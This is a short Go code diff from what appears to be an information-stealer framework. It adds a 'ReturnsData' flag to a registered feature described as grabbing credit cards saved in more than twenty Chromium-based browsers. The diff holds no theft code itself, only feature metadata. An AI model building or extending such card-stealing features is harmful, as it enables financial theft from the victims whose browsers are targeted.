@@ -9,6 +9,7 @@ func init() {
 	FeatureList = append(FeatureList, Feature{
 		Name:        "chrcc",
 		Description: "Grabs credit cards saved in 20+ chromium browsers",
+		ReturnsData: true,
 		Args:        []Arg{},
 		Dependencies: []string{
 			"chromium.lib.go",
